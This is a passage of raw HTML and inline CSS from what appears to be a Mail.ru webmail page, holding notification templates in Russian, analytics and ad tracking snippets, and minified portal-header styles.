								themeVariant = themeConfig.currentVariant = "v" +  widget.data.sign;
							}
						}
					break;
				}
			}
			return themeVariant;
		}

		window.chooseTheme = chooseTheme;

	})();
</script><style type="text/css">.jsdn {display: none;} .jsvh {visibility: hidden;}</style>







<link href="https://img.imgsmail.ru/mail/e/utf/ts/1442859548/css/septima/pages/main.print.css?v=1442859548" rel="stylesheet" type="text/css" media="print">











<style type="text/css">
	.compose__labels__input,
	.compose__labels__input_suggest,
	.compose__labels__label,
	.addressbook__suggest__item,
	.compose__header__field,
	.composeEditor {
			font-size: 13px;
		}
	@media screen and (min-width: 1200px) and (min-height: 500px) {
		.b-letter__body__wrap,
		.composeEditor {
			font-size: 15px;
			
		}

		.b-letter__body {
			line-height: 160%;
		}
	}
</style>


	<link rel="shortcut icon" type="image/x-icon" href="//img.imgsmail.ru/r/default/favicon.ico">

<link rel="apple-touch-icon" href="//img.imgsmail.ru/r/ru/ios/icon_114.png">

		<link rel="image_src" href="//img.imgsmail.ru/r/promopage/icon-socialnetwork.jpg">

	<script>__domTS('head__css')('head__wa');</script>
	
	<script>__domTS('head__wa');</script>
<script src="https://img.imgsmail.ru/p/h/d/0.37.16/external.min.js" type="text/javascript" async="" defer=""></script>
<script src="https://img.imgsmail.ru/p/pm/d/0.1.46/nocss.min.js" charset="utf-8" type="text/javascript" defer="" async=""></script></head>

	
			<body class="layout-fixed">
			

			<script>__domTS('body')</script>

			

			
			<div id="Notify" class="notify" style="display:none">

	<div class="js-ok notify-message">
	<div class="notify-message__title">
		
		<i class="icon icon_info-state icon_tip-ok"></i>&nbsp;
		
		<span class="js-txt _js-title notify-message__title__text notify-message__title__text_ok"></span>
	</div>
</div>
	<div class="js-error notify-message">
	<div class="notify-message__title">
		
		<i class="icon icon_info-state icon_info-state_warning"></i>&nbsp;
		
		<span class="js-txt _js-title notify-message__title__text notify-message__title__text_error">Ошибка</span>
	</div>
</div>
	<div class="js-warning notify-message">
	<div class="notify-message__title">
		
		<i class="icon icon_info-state icon_attention"></i>&nbsp;
		
		<span class="js-txt _js-title notify-message__title__text notify-message__title__text_error"></span>
	</div>
</div>
	<div class="js-load notify-message__title">
	
	<i class="icon icon_loader"></i>&nbsp;
	
	<span class="js-txt notify-message__title__text notify-message__title__text_loader">Идет загрузка</span>
</div>
	<div class="js-unknown notify-message__title">
	<span class="js-txt notify-message__title__text notify-message__title__text_loader">Идет загрузка</span>
</div>
	
	


<div class="js-collector-noauth notify-message" style="padding-right: 3px;">
	<div class="js-close notify__close">×</div>
	<div class="notify-message__title">
		<div class="notify-message__noauth__icon">
			<div id="js-notify-message__noauth__icon__provider" class="notify-message__noauth__icon__provider"></div>
		</div>

		<span class="js-txt _js-title"></span>
	</div>
	
	<div style="margin: 10px 0 0 0;">
		<div style="float: left;">
			<button class="js-change-password btn btn_main" style="margin-right: 0"><span class="btn__text">Восстановить сбор </span></button>
		</div>
		<div style="float: right; margin: 7px 10px 0 0;">
			<a href="#" class="js-remember-leter">Спасибо, я в курсе</a>
			<a href="#" class="js-dont-show" style="display: none;">Больше не напоминать</a>
		</div>
		<div class="clear"></div>
	</div>
	
</div>
	<div class="js-collector-blocked notify-message" style="padding-right: 3px;">
	<div class="js-close notify__close">×</div>
	<div class="notify-message__title">
		
		<i class="icon icon_info-state icon_info-state_warning"></i>&nbsp;
		<span class="js-txt _js-title notify-message__title__text notify-message__title__text_error"></span>
		
	</div>
	
	<div style="margin: 10px 10px 0 0; *width: 500px;">
		<div style="float: left;">
			<a href="http://mail.google.com/mail/" class="js-settings" target="_blank">
				Проверить настройки Gmail
			</a>
		</div>
		<div style="float: right;">
			<a href="#" class="js-remember-leter form__button form__button_reset" style="margin-right: 0;">
				Напомнить позже
			</a>
			<a href="#" class="js-dont-show form__button form__button_reset" style="margin-right: 0; display: none;">
				Больше не напоминать
			</a>
		</div>
		<div class="clear"></div>
	</div>
	
</div>
	<div class="js-beta-tester notify-message" style="padding-right: 3px;">
	<div class="js-close notify__close">×</div>
	<div style="margin: 10px 30px; text-align: center">
		
		<button class="js-yes btn btn_main" style="margin-right: 0"><span class="btn__text"> Запишись в бета-тестеры </span></button>
		
	</div>
</div>

</div>



			
				<a class="link" href="//r.mail.ru/n122193096/m.mail.ru/cgi-bin/msglist" style="position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(1px 1px 1px 1px); /* IE6, IE7 */ clip: rect(1px, 1px, 1px, 1px);">Перейти на версию для людей с ограниченными возможностями.</a>
			

			<div id="__FFA__"></div>
			<div id="__FAA__"></div>

			<div id="themeId" class="themeId"></div>
			<div style="min-height: 364px;" id="themeInner">
				<div class="balloon" id="TipOfTheDay" style="left:0; top:-300px; display: none">
	<div class="balloon__t">
		<i class="balloon__cn balloon__cn_tl"></i>
		<i class="balloon__cn balloon__cn_tr"></i>
		<i class="balloon__cn balloon__cn_tc"></i>
	</div>
	<div class="balloon__i">
		<i class="balloon__icon" title="Закрыть">×<i></i></i>
		<i class="balloon__sh balloon__sh_l"></i>
		<i class="balloon__sh balloon__sh_r"></i>
		<i class="balloon__cn balloon__cn_lc"></i>
		<i class="balloon__cn balloon__cn_rc"></i>
		<div class="balloon__content th-place"></div>
	</div>
	<div class="balloon__b">
		<i class="balloon__cn balloon__cn_bl"></i>
		<i class="balloon__cn balloon__cn_br"></i>
	</div>
</div>

					
<div id="browser-alert" class="browser-alert" style="display: none;">
	<i class="js-close browser-alert__close" title="Закрыть">×</i>
	<div class="js-alert js-notifications-api browser-alert__text">
		Если вы хотите, чтобы мы отправляли вам уведомления, то нажмите на кнопку «Разрешить» в вашем браузере
	</div>
</div>


					<div style="position:absolute;left:-10000px;">
<!-- tns-counter.ru --> 
<script language="JavaScript" type="text/javascript"> 
	var img = new Image();
	img.src = '//www.tns-counter.ru/V13a***R>' + document.referrer.replace(/\*/g,'%2a') + '*mail_ru/ru/UTF-8/tmsec=mail_win/' + Math.round(Math.random() * 1000000000);
</script> 

<noscript> 
	<img src="//www.tns-counter.ru/V13a****mail_ru/ru/UTF-8/tmsec=mail_win/" width="1" height="1" alt="">
</noscript> 
<!--/ tns-counter.ru -->


<img src="//ad.mail.ru/i93.gif" style="width:0;height:0;position:absolute;" alt="">


</div>




	
		


	







	
	
	
	
	

	

	

<!--noindex-->

 
 























	
	

	
		
	
		
	<style>.x-ph{position:relative;z-index:1003;margin:0;padding:0;font:12px/16px "Helvetica Neue",Arial,sans-serif;white-space:nowrap;text-align:left;background:#fff;height:28px;*zoom:1}.w-x-ph{width:100%;margin:0;padding:0;border:0;border-spacing:0;border-collapse:collapse;font:12px/16px "Helvetica Neue",Arial,sans-serif;background:#fff}.w-x-ph__col{height:28px;padding:0;margin:0;border:0;border-spacing:0;vertical-align:top;white-space:nowrap;font:12px/16px "Helvetica Neue",Arial,sans-serif}.w-x-ph__col_left{width:1%;padding-right:20px;text-align:left}.w-x-ph__col_right{text-align:right}.x-ph__menu{position:relative;z-index:1004;display:inline-block;padding-right:2px;font:12px/16px "Helvetica Neue",Arial,sans-serif;vertical-align:top}.w-x-ph__menu__placeholder{position:absolute;top:100%;left:50%;width:0;height:0;font:0/0 a}.x-ph__menu__button,.x-ph__menu__button:link,.x-ph__menu__button:visited,.x-ph__menu__button:hover,.x-ph__menu__button:active,.x-ph__menu__button:focus{position:relative;z-index:1005;display:inline-block;width:100%;padding:6px 0 5px 0;border-right:1px solid #fff;border-left:1px solid #fff;font:12px/16px "Helvetica Neue",Arial,sans-serif;text-decoration:none;cursor:pointer;outline:none}.x-ph-ff.x-ph-win .x-ph__menu__button,.x-ph-ff.x-ph-win .x-ph__menu__button:link,.x-ph-ff.x-ph-win .x-ph__menu__button:visited,.x-ph-ff.x-ph-win .x-ph__menu__button:hover,.x-ph-ff.x-ph-win .x-ph__menu__button:active,.x-ph-ff.x-ph-win .x-ph__menu__button:focus{padding-top:5px;padding-bottom:7px}.x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text{display:inline-block;width:100%;padding:0 14px 0 6px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;color:#1378bf;font-style:normal;text-decoration:none;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;text-align:left;vertical-align:top}.x-ph__menu__button:hover .x-ph__menu__button__text,.x-ph__menu__button:focus .x-ph__menu__button__text,.x-ph__menu__button:active .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__text{color:#f26d00}.x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__icon{position:absolute;right:5px;top:13px;width:0;height:0;border-width:4px;border-style:solid;border-color:#1378bf #fff #fff;font:0/0 a}.x-ph__menu__button:hover .x-ph__menu__button__icon,.x-ph__menu__button:focus .x-ph__menu__button__icon,.x-ph__menu__button:active .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__icon{border-color:#f26d00 #fff #fff}.x-ph__menu_open .x-ph__menu__button .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__icon{border-color:#333 #fff #fff}.w-x-ph__menu__button__shadow{position:absolute;z-index:1007;top:0;opacity:0;width:50px;height:0;background:#fff;-webkit-box-shadow:0 4px 15px rgba(0,0,0,0.2);-moz-box-shadow:0 4px 15px rgba(0,0,0,0.2);box-shadow:0 4px 15px rgba(0,0,0,0.2)}.x-ph__link,.x-ph__link:link,.x-ph__link:visited,.x-ph__link:hover,.x-ph__link:active,.x-ph__link:focus{display:inline-block;margin-right:6px;color:#1378bf;text-decoration:none;white-space:nowrap;*zoom:1;outline:none;padding:6px 6px 6px;*padding:5px 6px 7px;font:12px/16px "Helvetica Neue",Arial,sans-serif}.x-ph-ff.x-ph-win .x-ph__link,.x-ph-ff.x-ph-win .x-ph__link:link,.x-ph-ff.x-ph-win .x-ph__link:visited,.x-ph-ff.x-ph-win .x-ph__link:hover,.x-ph-ff.x-ph-win .x-ph__link:active,.x-ph-ff.x-ph-win .x-ph__link:focus{padding:5px 6px 7px}.x-ph__auth__link_icon,.x-ph__auth__link_icon:link,.x-ph__auth__link_icon:visited,.x-ph__auth__link_icon:hover,.x-ph__auth__link_icon:active,.x-ph__auth__link_icon:focus{position:relative;width:16px;height:28px;padding:0 6px 0 !important;overflow:hidden;vertical-align:top;color:#fff !important;text-indent:30px}.x-ph__auth__link_icon:after{display:block !important;position:absolute;top:2px;left:2px}.x-ph__link:hover,.x-ph__link:focus,.x-ph__link:active{color:#f26d00}.x-ph__link_first,.x-ph__link_first:link,.x-ph__link_first:visited,.x-ph__link_first:hover,.x-ph__link_first:active,.x-ph__link_first:focus{margin-left:14px}.x-ph__link_last,.x-ph__link_last:link,.x-ph__link_last:visited,.x-ph__link_last:hover,.x-ph__link_last:active,.x-ph__link_last:focus{margin-right:12px}.x-ph__link_ext,.x-ph__link_ext:link,.x-ph__link_ext:visited,.x-ph__link_ext:hover,.x-ph__link_ext:active,.x-ph__link_ext:focus{padding-right:1px;text-decoration:none}.x-ph__link_selected,.x-ph__link_selected:link,.x-ph__link_selected:visited,.x-ph__link_selected:hover,.x-ph__link_selected:active,.x-ph__link_selected:focus{font-weight:bold}.x-ph__link__text{font-style:normal;text-decoration:none;cursor:pointer}.x-ph__link:hover .x-ph__link__text{color:#f26d00;text-decoration:none}.x-ph__link__balloon{display:none;min-width:9px;margin-left:3px;color:#fff;font-weight:normal;font-style:normal;text-align:center;font-size:11px;background-color:#ffa930;-webkit-border-radius:7px;-moz-border-radius:7px;border-radius:7px;line-height:13px;overflow:hidden;height:13px;padding:1px 3px 1px 3px;vertical-align:baseline;margin-bottom:-4px;cursor:pointer;-webkit-animation-fill-mode:both;-moz-animation-fill-mode:both;-ms-animation-fill-mode:both;-o-animation-fill-mode:both;animation-fill-mode:both;-webkit-animation-duration:500ms;-moz-animation-duration:500ms;-ms-animation-duration:500ms;-o-animation-duration:500ms;animation-duration:500ms}.x-ph-ff.x-ph-mac .x-ph__link__balloon,.x-ph-opera .x-ph__link__balloon{line-height:14px}.x-ph__link_ext .x-ph__link__balloon{display:inline-block;*display:inline;*zoom:1}.x-ph-ios .x-ph__link__balloon{padding:0px 3px 2px 3px;margin-bottom:-5px}.x-ph__auth{width:100%;border:0;margin:0;padding:0;border:0;border-spacing:0;font:12px/16px "Helvetica Neue",Arial,sans-serif}.w-x-ph__auth__col{border:0;margin:0;padding:0;border:0;border-spacing:0;vertical-align:top;text-align:right;white-space:nowrap;font:12px/16px "Helvetica Neue",Arial,sans-serif}.w-x-ph__auth__col_left{width:99%}.w-x-ph__auth__col_right{padding-right:2px}.x-ph__auth__user{position:relative;display:block;width:100%;min-width:100px;height:28px;overflow:hidden}.w-x-ph__auth__user_inner{position:absolute;right:0;text-align:left;max-width:100%}.x-ph__auth__user__text{color:#000;display:inline-block;padding:6px 10px 6px 0;_padding:5px 10px 7px 0;font:12px/16px "Helvetica Neue",Arial,sans-serif}.x-ph__auth__user__fade{position:absolute;top:0;right:-6px;width:16px;height:28px;overflow:hidden;background:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/auth/fade2.png") repeat-y 0 0;_display:none}.x-ph__auth__link,.x-ph__auth__link:link,.x-ph__auth__link:visited,.x-ph__auth__link:hover,.x-ph__auth__link:active,.x-ph__auth__link:focus{font:12px/16px "Helvetica Neue",Arial,sans-serif}.w-x-ph__auth__dropdown{position:relative;display:block;min-width:100px;width:100%;height:1px;text-align:right}.w-x-ph__auth__dropdown__inner{position:absolute;right:6px;width:100%;min-width:100px;text-align:right}.x-ph__menu_auth{max-width:100%}.x-ph__menu__button_auth,.x-ph__menu__button_auth:link,.x-ph__menu__button_auth:visited,.x-ph__menu__button_auth:hover,.x-ph__menu__button_auth:active,.x-ph__menu__button_auth:focus{max-width:100%}.x-ph__menu__button__text_auth{position:relative}.x-ph__menu__button__text_auth,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text_auth{max-width:560px}.x-ph__menu_auth_unread .x-ph__menu__button__text_auth,.x-ph__menu_auth_unread.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text_auth{padding-left:14px}.x-ph__menu__button_auth__unread{display:none;position:absolute;left:4px;top:12px;width:6px;height:6px;background:#FFA930;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.x-ph__menu_auth_unread .x-ph__menu__button_auth__unread{display:block}.x-ph__menu_open .x-ph__menu__button .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__text,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__text{color:#333}.x-ph__menu_open .x-ph__menu__button .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:hover .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:focus .x-ph__menu__button__icon,.x-ph__menu_open .x-ph__menu__button:active .x-ph__menu__button__icon{border-color:#333 #fff #fff}.x-ph__menu__button_auth__unread{background-position:0 -133px}.x-ph__menu__button__text__icon,.x-ph__auth_list__item__info__social{vertical-align:top;width:16px;height:16px;-webkit-border-radius:8px;-moz-border-radius:8px;border-radius:8px;display:inline-block;overflow:hidden}.x-ph__menu__button__text__icon:after,.x-ph__auth_list__item__info__social:after{margin:-4px 0 0 -4px}
/*# sourceMappingURL=inline.css.map */
</style><div class="x-ph portal-headline x-ph-ff x-ph-win x-ph-no-touch x-ph-box-shadow" id="portal-headline"><style type="text/css">.x-ph__button,.x-ph__button:link,.x-ph__button:visited,.x-ph__button:hover,.x-ph__button:focus,.x-ph__button:active{position:relative;display:inline-block;padding-top:4px;padding-bottom:4px;font:13px/16px Arial,sans-serif;text-decoration:none;vertical-align:baseline;-webkit-user-select:none;-moz-user-select:none;user-select:none;outline:none}.x-ph__button__input{position:absolute;top:0;left:0;display:block;width:100%;height:26px;margin:0;padding:0;outline:none;font-size:100px;filter:alpha(opacity=0);opacity:0;cursor:pointer;-webkit-appearance:none}.x-ph__button__input[disabled="disabled"]{cursor:default}.x-ph__button__fake{padding:5px 13px 6px;font:13px/18px Arial,sans-serif;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;border:1px solid #d1d1d1;background-color:#f8f8f8;background-image:-moz-linear-gradient(top, rgba(255,255,255,0.03) 0%, rgba(0,0,0,0.03) 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0%, rgba(255,255,255,0.03)), color-stop(100%, rgba(0,0,0,0.03)));background-image:-webkit-linear-gradient(top, rgba(255,255,255,0.03) 0%, rgba(0,0,0,0.03) 100%);background-image:-o-linear-gradient(top, rgba(255,255,255,0.03) 0%, rgba(0,0,0,0.03) 100%);background-image:-ms-linear-gradient(top, rgba(255,255,255,0.03) 0%, rgba(0,0,0,0.03) 100%);background-image:linear-gradient(to bottom, rgba(255,255,255,0.03) 0%, rgba(0,0,0,0.03) 100%);-webkit-box-shadow:0 1px 0 1px rgba(0,0,0,0.05);-moz-box-shadow:0 1px 0 1px rgba(0,0,0,0.05);box-shadow:0 1px 0 1px rgba(0,0,0,0.05);text-align:center;color:#000;text-shadow:0 1px rgba(255,255,255,0.6);cursor:pointer;vertical-align:baseline;white-space:nowrap}.x-ph__button_action .x-ph__button__fake,.x-ph__button_action:link .x-ph__button__fake,.x-ph__button_action:visited .x-ph__button__fake,.x-ph__button_action:hover .x-ph__button__fake,.x-ph__button_action:focus .x-ph__button__fake,.x-ph__button_action:active .x-ph__button__fake{padding:6px 13px;font:13px/16px Arial,sans-serif;color:#fff;border-color:#168de2;background:#168de2;text-shadow:none;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px}a:hover .x-ph__button__fake,a:focus .x-ph__button__fake,.x-ph__button__fake:hover,.x-ph__button__fake:focus,.x-ph__button:hover .x-ph__button__fake,.x-ph__button:focus .x-ph__button__fake,.x-ph__button__input:hover+.x-ph__button__fake,.x-ph__button__input:focus+.x-ph__button__fake{background-color:#fcfcfc}.x-ph__button_action .x-ph__button__fake:hover,.x-ph__button_action .x-ph__button__fake:focus,.x-ph__button_action:hover .x-ph__button__fake,.x-ph__button_action:focus .x-ph__button__fake,.x-ph__button_action .x-ph__button__input:hover+.x-ph__button__fake,.x-ph__button_action .x-ph__button__input:focus+.x-ph__button__fake{border-color:#1581cf;background:#1581cf}a:active .x-ph__button__fake,.x-ph__button__fake:active,.x-ph__button:active .x-ph__button__fake,.x-ph__button:hover .x-ph__button__fake:active,.x-ph__button__input:active+.x-ph__button__fake{background-color:#fcfcfc}.x-ph__button_action .x-ph__button__fake:active,.x-ph__button_action:active .x-ph__button__fake,.x-ph__button_action:hover .x-ph__button__fake:active,.x-ph__button_action .x-ph__button__input:active+.x-ph__button__fake{border-color:#147fcb;background:#147fcb}.x-ph__button_disabled .x-ph__button__fake,.x-ph__button__input[disabled="disabled"]+.x-ph__button__fake,.x-ph__button:hover .x-ph__button__input[disabled="disabled"]+.x-ph__button__fake,.x-ph__button:focus .x-ph__button__input[disabled="disabled"]+.x-ph__button__fake{border-color:#f4f4f4;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAbCAIAAAA70dJZAAAAK0lEQVR42mL8//8/AxJgpDf/379/NOX//fuXqvw/f/7QlP/79298fIAAAwDaGVBNDHs/egAAAABJRU5ErkJggg==) !important;cursor:default !important}.x-ph__button_action.x-ph__button_disabled .x-ph__button__fake,.x-ph__button_action .x-ph__button__input[disabled="disabled"]+.x-ph__button__fake,.x-ph__button_action:hover .x-ph__button__input[disabled="disabled"]+.x-ph__button__fake,.x-ph__button_action:focus .x-ph__button__input[disabled="disabled"]+.x-ph__button__fake{border-color:#9daec1;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAbCAYAAAC0s0UOAAAALElEQVR42mL8////QgY0wMSABbAAVVIgSAszsQv++/ePPhYNEXfSIuQBAgwAKeBIt3cEBisAAAAASUVORK5CYII=) !important}.x-ph__button_dark .x-ph__button__fake,.x-ph__button_dark:link .x-ph__button__fake,.x-ph__button_dark:visited .x-ph__button__fake,.x-ph__button_dark:hover .x-ph__button__fake,.x-ph__button_dark:focus .x-ph__button__fake,.x-ph__button_dark:active .x-ph__button__fake{color:#fff;text-shadow:0 -1px rgba(0,0,0,0.3)}.x-ph__button_only-icon .x-ph__button__fake,.x-ph__button_only-icon:link .x-ph__button__fake,.x-ph__button_only-icon:visited .x-ph__button__fake,.x-ph__button_only-icon:hover .x-ph__button__fake,.x-ph__button_only-icon:focus .x-ph__button__fake,.x-ph__button_only-icon:active .x-ph__button__fake{padding-right:12px;padding-left:12px}.x-ph__button_with-icon .x-ph__button__fake,.x-ph__button_with-icon:link .x-ph__button__fake,.x-ph__button_with-icon:visited .x-ph__button__fake,.x-ph__button_with-icon:hover .x-ph__button__fake,.x-ph__button_with-icon:focus .x-ph__button__fake,.x-ph__button_with-icon:active .x-ph__button__fake{padding-left:15px}.x-ph__button_only-icon .x-ph__button__fake__text,.x-ph__button_only-icon:link .x-ph__button__fake__text,.x-ph__button_only-icon:visited .x-ph__button__fake__text,.x-ph__button_only-icon:hover .x-ph__button__fake__text,.x-ph__button_only-icon:focus .x-ph__button__fake__text,.x-ph__button_only-icon:active .x-ph__button__fake__text{display:none}.x-ph__button_with-icon .x-ph__button__fake__text,.x-ph__button_with-icon:link .x-ph__button__fake__text,.x-ph__button_with-icon:visited .x-ph__button__fake__text,.x-ph__button_with-icon:hover .x-ph__button__fake__text,.x-ph__button_with-icon:focus .x-ph__button__fake__text,.x-ph__button_with-icon:active .x-ph__button__fake__text{margin-left:5px}.x-ph__button_disabled .x-ph__button__fake__text,.x-ph__button__input[disabled="disabled"]+.x-ph__button__fake .x-ph__button__fake__text{opacity:0.6 !important;filter:alpha(opacity=60) !important}.x-ph__button__fake__icon{position:relative;display:none;width:16px;height:16px;font:0/0 a;background-repeat:no-repeat;vertical-align:baseline;overflow:hidden}.x-ph__button_with-icon .x-ph__button__fake__icon,.x-ph__button_with-icon:link .x-ph__button__fake__icon,.x-ph__button_with-icon:visited .x-ph__button__fake__icon,.x-ph__button_with-icon:hover .x-ph__button__fake__icon,.x-ph__button_with-icon:focus .x-ph__button__fake__icon,.x-ph__button_with-icon:active .x-ph__button__fake__icon,.x-ph__button_only-icon .x-ph__button__fake__icon,.x-ph__button_only-icon:link .x-ph__button__fake__icon,.x-ph__button_only-icon:visited .x-ph__button__fake__icon,.x-ph__button_only-icon:hover .x-ph__button__fake__icon,.x-ph__button_only-icon:focus .x-ph__button__fake__icon,.x-ph__button_only-icon:active .x-ph__button__fake__icon{display:inline-block}.x-ph__button_disabled .x-ph__button__fake__icon,.x-ph__button__input[disabled="disabled"]+.x-ph__button__fake .x-ph__button__fake__icon{opacity:0.2 !important;filter:alpha(opacity=20) !important}.x-ph__button__fake__icon{width:11px;margin-bottom:-4px;background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/auth/icons.gif")}.x-ph__button__fake__icon_plus{background-position:0 0}.x-ph__button__fake__icon_exit{background-position:0 -20px}.x-ph__menu_open{z-index:1006}.x-ph__menu_open .x-ph__menu__button,.x-ph__menu_open .x-ph__menu__button:link,.x-ph__menu_open .x-ph__menu__button:visited,.x-ph__menu_open .x-ph__menu__button:hover,.x-ph__menu_open .x-ph__menu__button:active,.x-ph__menu_open .x-ph__menu__button:focus{border-color:#efefef;padding-bottom:6px;z-index:1010;background:#fff}.x-ph-ff.x-ph-win .x-ph__menu_open .x-ph__menu__button,.x-ph-ff.x-ph-win .x-ph__menu_open .x-ph__menu__button:link,.x-ph-ff.x-ph-win .x-ph__menu_open .x-ph__menu__button:visited,.x-ph-ff.x-ph-win .x-ph__menu_open .x-ph__menu__button:hover,.x-ph-ff.x-ph-win .x-ph__menu_open .x-ph__menu__button:active,.x-ph-ff.x-ph-win .x-ph__menu_open .x-ph__menu__button:focus{padding-bottom:7px}.x-ph-box-shadow .x-ph__menu_open .x-ph__menu__button,.x-ph-box-shadow .x-ph__menu_open .x-ph__menu__button:link,.x-ph-box-shadow .x-ph__menu_open .x-ph__menu__button:visited,.x-ph-box-shadow .x-ph__menu_open .x-ph__menu__button:hover,.x-ph-box-shadow .x-ph__menu_open .x-ph__menu__button:active,.x-ph-box-shadow .x-ph__menu_open .x-ph__menu__button:focus{border-color:#fff}.x-ph-no-box-shadow .x-ph__menu_open .x-ph__menu__button,.x-ph-no-box-shadow .x-ph__menu_open .x-ph__menu__button:link,.x-ph-no-box-shadow .x-ph__menu_open .x-ph__menu__button:visited,.x-ph-no-box-shadow .x-ph__menu_open .x-ph__menu__button:hover,.x-ph-no-box-shadow .x-ph__menu_open .x-ph__menu__button:active,.x-ph-no-box-shadow .x-ph__menu_open .x-ph__menu__button:focus{border-color:#efefef}.x-ph__menu_open_left .w-x-ph__menu__button__shadow_left{left:0;height:28px;clip:rect(0, 0px, 45px, -20px)}.x-ph__menu_open_right .w-x-ph__menu__button__shadow_left{left:0;height:28px;clip:rect(0, 0px, 28px, -20px)}.x-ph__menu_open_left .w-x-ph__menu__button__shadow_right{right:0;height:28px;clip:rect(0, 70px, 28px, 50px)}.x-ph__menu_open_right .w-x-ph__menu__button__shadow_right{right:0;height:28px;clip:rect(0, 60px, 45px, 50px)}.x-ph__menu_open .w-x-ph__menu__button__shadow{opacity:1;-webkit-transition:opacity 0.2s;-moz-transition:opacity 0.2s;-o-transition:opacity 0.2s;transition:opacity 0.2s}.x-ph__menu__dropdown{display:none;position:absolute;top:-9999px;left:-9999px;z-index:1009;visibility:hidden;opacity:0}.w-x-ph__menu__dropdown{position:relative;border:1px solid #fff;-webkit-border-radius:0 0 2px 2px;-moz-border-radius:0 0 2px 2px;border-radius:0 0 2px 2px;-webkit-box-shadow:0 4px 15px rgba(0,0,0,0.2);-moz-box-shadow:0 4px 15px rgba(0,0,0,0.2);box-shadow:0 4px 15px rgba(0,0,0,0.2);background:#fff}.x-ph-box-shadow .w-x-ph__menu__dropdown{border:1px solid #fff}.x-ph-no-box-shadow .w-x-ph__menu__dropdown{border:1px solid #efefef}.w-x-ph__menu__dropdown__clearfix{display:block;height:0;clear:both;overflow:hidden;font:0/0 a}.x-ph__menu_open .x-ph__menu__dropdown{top:28px;visibility:visible;opacity:1;-webkit-transition:opacity 0.2s;-moz-transition:opacity 0.2s;-o-transition:opacity 0.2s;transition:opacity 0.2s}.x-ph-no-box-shadow .x-ph__menu_open .x-ph__menu__dropdown{top:27px}.x-ph__menu_open_left .x-ph__menu__dropdown{left:0}.x-ph__menu_open_left .w-x-ph__menu__dropdown{-webkit-border-top-left-radius:0;-moz-border-top-left-radius:0;border-top-left-radius:0}.x-ph__menu_open_right .x-ph__menu__dropdown{left:auto;right:0}.x-ph__menu_open_right .w-x-ph__menu__dropdown{-webkit-border-top-right-radius:0;-moz-border-top-right-radius:0;border-top-right-radius:0}.x-ph__projects{width:590px}.x-ph__projects__col{float:left;width:120px;padding-top:4px;padding-bottom:4px;padding-left:4px}.x-ph-no-touch .x-ph__projects__col{padding-top:7px;padding-bottom:7px}.x-ph__projects__col_1{width:114px;padding:0 0 0 0}.x-ph__projects__col_2{width:142px;padding:0 1px 0 1px}.x-ph__projects__col_3{width:137px;padding:0 1px 0 1px}.x-ph__projects__col_4{width:191px;padding:0 0 0 0}.x-ph__projects__col_separator{position:relative;margin-bottom:-1px;border-bottom:1px solid #fff}.x-ph__projects__col_separator:after{content:' ';display:block;position:absolute;left:0;bottom:0;right:10px;height:0px;overflow:hidden;border-bottom:1px solid #f0f0f0}.x-ph__projects__link,.x-ph__projects__link:link,.x-ph__projects__link:visited,.x-ph__projects__link:hover,.x-ph__projects__link:active,.x-ph__projects__link:focus{display:block;color:#1378bf;text-align:left;text-decoration:none;white-space:nowrap;cursor:pointer;outline:none;height:40px;padding:0 14px;margin-bottom:2px;overflow:hidden;font-size:14px;line-height:40px}.x-ph-no-touch .x-ph__projects__link,.x-ph-no-touch .x-ph__projects__link:link,.x-ph-no-touch .x-ph__projects__link:visited,.x-ph-no-touch .x-ph__projects__link:hover,.x-ph-no-touch .x-ph__projects__link:active,.x-ph-no-touch .x-ph__projects__link:focus{font-size:12px;line-height:30px;height:30px}.x-ph__projects__link:hover,.x-ph__projects__link:focus,.x-ph__projects__link:active{color:#f26d00;background:#fff}.x-ph__projects__link_icon,.x-ph__projects__link_icon:link,.x-ph__projects__link_icon:visited,.x-ph__projects__link_icon:hover,.x-ph__projects__link_icon:active,.x-ph__projects__link_icon:focus{padding-left:30px}.x-ph__projects__link_icon__pic{position:absolute;width:16px;height:16px;margin-top:12px;margin-left:-21px;background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/projects/projectsicons.png");background-repeat:no-repeat;background-size:100% auto}.x-ph-no-touch .x-ph__projects__link_icon__pic{margin-top:6px}@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min--moz-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3 / 2), only screen and (min-device-pixel-ratio: 1.5){.x-ph__projects__link_icon__pic{background-image:url("//img.imgsmail.ru/p/h/d/0.37.16/blocks/projects/projectsicons@2x.png")}}.x-ph__projects__link_icon__pic_agent{background-position:0 0}.x-ph__projects__link_icon__pic_icq{background-position:0 -20px}.x-ph__projects__link_icon__pic_browser{background-position:0 